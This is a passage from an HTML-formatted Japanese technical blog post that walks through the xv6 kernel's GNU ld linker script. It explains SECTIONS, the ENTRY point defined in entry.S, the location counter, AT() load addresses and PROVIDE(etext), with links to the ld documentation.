	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;end &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;DISCARD&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;eh_frame &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;note&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;GNU&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;stack&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;リンカスクリプトの構造&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%B3%E3%82%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E6%A7%8B%E9%80%A0&quot; aria-label=&quot;リンカスクリプトの構造 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リンカスクリプトの構造&lt;/h3&gt;
&lt;p&gt;リンカスクリプトとして最低限必須となる記述は、&lt;code class=&quot;language-text&quot;&gt;SECTIONS&lt;/code&gt;要素です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;MEMORY&lt;/code&gt;要素を定義する場合が多いですが、必須ではありません。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SECTIONS&lt;/code&gt;要素ではセクションを定義し、任意のアドレスに配置します。&lt;/p&gt;
&lt;p&gt;このアドレスは、物理アドレスと仮想アドレスのどちらも定義可能です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.computex.co.jp/article/use_gcc_1.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GNU Cを使いこなそう | 株式会社コンピューテックス&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://blueeyes.sakura.ne.jp/2018/10/31/1676/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リンカスクリプトの書き方&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SECTIONS&lt;/code&gt;要素のみが定義された最も単純なリンカスクリプトは以下の例のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;SECTIONS
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x8000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Simple-Example.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Simple Example (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSのリンカスクリプトでは、以下のセクションが定義されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.text : 実行バイナリが配置される。通常は読み取り/実行権限のみ。&lt;/li&gt;
&lt;li&gt;.rodata : 読み取り専用データが配置される。&lt;/li&gt;
&lt;li&gt;.stab : スタブと呼ばれる固定長構造体の配列が配置される。&lt;/li&gt;
&lt;li&gt;.stabstr : スタブから参照される可変長文字列が配置される。&lt;/li&gt;
&lt;li&gt;.data : 読み書き可能なデータが配置される。&lt;/li&gt;
&lt;li&gt;.bss : ブロック開始記号(宣言されているがまだ値が割り当てられていないオブジェクト)が配置される。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://opensource.apple.com/source/gdb/gdb-292/doc/stabs.html/stabs_13.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;STABS - Using Stabs in Their Own Sections&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://doc.ecoscentric.com/gnutools/doc/stabs/Stab-Section-Basics.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;STABS: Stab Section Basics&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/.bss&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;.bss - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;リンカスクリプトの内容について順に見ていきます。&lt;/p&gt;
&lt;h3 id=&quot;エントリポイントの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;エントリポイントの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;エントリポイントの定義&lt;/h3&gt;
&lt;p&gt;リンカスクリプトの先頭行を見ると、3つの定義がされています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Simple linker script for the JOS kernel.
   See the GNU ld &apos;info&apos; manual (&quot;info ld&quot;) to learn the syntax. */&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;OUTPUT_FORMAT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;OUTPUT_ARCH&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i386&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ENTRY&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_start&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;OUTPUT_FORMAT&lt;/code&gt;では、出力バイナリのフォーマットを定義しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;OUTPUT_ARCH&lt;/code&gt;では、出力されるバイナリがどのアーキテクチャに対応するかを指定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ENTRY&lt;/code&gt;では、一番初めに実行される関数のシンボル名を指定しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Entry-Point.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Entry Point (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここで指定されている&lt;code class=&quot;language-text&quot;&gt;_start&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;の中で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# By convention, the _start symbol specifies the ELF entry point.
# Since we haven&amp;#39;t set up virtual memory yet, our entry point is
# the physical address of &amp;#39;entry&amp;#39;.
.globl _start
_start = V2P_WO(entry)

# Entering xv6 on boot processor, with paging off.
.globl entry
entry:
  # Turn on page size extension for 4Mbyte pages
  movl    %cr4, %eax
  orl     $(CR4_PSE), %eax
  movl    %eax, %cr4
  # Set page directory
  movl    $(V2P_WO(entrypgdir)), %eax
  movl    %eax, %cr3
  # Turn on paging.
  movl    %cr0, %eax
  orl     $(CR0_PG|CR0_WP), %eax
  movl    %eax, %cr0

  # Set up the stack pointer.
  movl $(stack + KSTACKSIZE), %esp

  # Jump to main(), and switch to executing at
  # high addresses. The indirect call is needed because
  # the assembler produces a PC-relative instruction
  # for a direct jump.
  mov $main, %eax
  jmp *%eax

.comm stack, KSTACKSIZE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;の詳細については後述します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yohei.codes/ja/post/xv6-memory-1/#kernelld&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6: OSはどうメモリを参照、管理するのか（前編） - yohei.codes&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;sectionstextセクションの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionstext%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;sectionstextセクションの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：textセクションの定義&lt;/h3&gt;
&lt;p&gt;まずはtextセクションの定義を行っている箇所を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Link the kernel at this address: &quot;.&quot; means the current address */&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;/* Must be equal to KERNLINK */&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;AT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stub &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;gnu&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;linkonce&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;t&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;etext &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;token comment&quot;&gt;/* Define the &apos;etext&apos; symbol to this value */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最初の行で定義されている&lt;code class=&quot;language-text&quot;&gt;. = 0x80100000;&lt;/code&gt;では、特殊記号&lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt;の値を設定します。&lt;/p&gt;
&lt;p&gt;これは、ロケーションカウンタとして使用されます。&lt;/p&gt;
&lt;p&gt;以降に定義されたセクションは、ロケーションカウンタの指すアドレスから開始されます。&lt;/p&gt;
&lt;p&gt;セクションが定義されると、ロケーションカウンタはそのサイズ分インクリメントされます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Simple-Example.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Simple Example (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSでは、ロケーションカウンタの初期値として&lt;code class=&quot;language-text&quot;&gt;0x80100000&lt;/code&gt;が定義されています。&lt;/p&gt;
&lt;p&gt;これによって、リンカによって出力されるバイナリの命令アドレスは&lt;code class=&quot;language-text&quot;&gt;0x80100000&lt;/code&gt;から開始されることになります。&lt;/p&gt;
&lt;p&gt;セクションの定義は、以下の構造で行われます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;section &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;address&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;AT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lma&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ALIGN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;section_align&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; ALIGN_WITH_INPUT&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;SUBALIGN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;subsection_align&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;constraint&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    output&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;section&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;command
    output&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;section&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;command
    …
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;region&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;AT&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;lma_region&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;phdr &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;phdr …&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;fillexp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Output-Section-Description.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Output Section Description (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;AT(0x100000)&lt;/code&gt;は、セクションのロードアドレスを&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;と定義しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_21.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Using LD, the GNU linker - Section Options&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;*(.text .stub .text.* .gnu.linkonce.t.*)&lt;/code&gt;の行は何をしているのか正直全くわからなかったのですが、セクションのコンテンツを定義している行のようです。&lt;/p&gt;
&lt;p&gt;いくつか定義の方法がありますが、基本的には&lt;code class=&quot;language-text&quot;&gt;ファイル名(シンボル)&lt;/code&gt;の形式で定義されます。&lt;/p&gt;
&lt;p&gt;複数行に渡って定義することが可能です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;*()&lt;/code&gt;のように、ファイル名の代わりに&lt;code class=&quot;language-text&quot;&gt;*&lt;/code&gt;を使用した場合は、リンク時に与えられたオブジェクトファイルの全てが対象になります。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;*(.text .stub .text.* .gnu.linkonce.t.*)&lt;/code&gt;の行は、入力されたオブジェクトファイルの持つ&lt;code class=&quot;language-text&quot;&gt;.text .stub .text.* .gnu.linkonce.t.*&lt;/code&gt;の各セクションのデータをリンカが作成する実行ファイルの&lt;code class=&quot;language-text&quot;&gt;.text.&lt;/code&gt;セクションに配置する、という命令です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_19.html#SEC19&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Using LD, the GNU linker - Section Placement&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;リンカの入力で与えられている&lt;code class=&quot;language-text&quot;&gt;entry.o&lt;/code&gt;や&lt;code class=&quot;language-text&quot;&gt;bio.o&lt;/code&gt;などのファイルは、いずれも32bitELF形式でコンパイルされているため、それぞれがヘッダや&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;セクションを持っています。&lt;/p&gt;
&lt;p&gt;これらを一つの実行ファイルとして統合するために上記のような定義がされているんですね。&lt;/p&gt;
&lt;p&gt;続いて&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;セクションの定義が完了したため、セグメントの終了を示す&lt;code class=&quot;language-text&quot;&gt;etext&lt;/code&gt;を定義する必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;etext &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;token comment&quot;&gt;/* Define the &apos;etext&apos; symbol to this value */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/LDP_man-pages/man3/end.3.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of END&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;PROVIDE&lt;/code&gt;を使って、カレントロケーションに&lt;code class=&quot;language-text&quot;&gt;etext&lt;/code&gt;を設定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PROVIDE&lt;/code&gt;は、シンボルがコード上で未定義の場合にのみシンボルを作成する命令です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/PROVIDE.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;PROVIDE (LD)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;sectionsrodataセクションの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionsrodata%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;sectionsrodataセクションの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：rodataセクションの定義&lt;/h3&gt;
&lt;p&gt;続いて&lt;code class=&quot;language-text&quot;&gt;.rodata&lt;/code&gt;セクションを定義します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;rodata&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;Read Only Data&lt;/code&gt;の意味です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
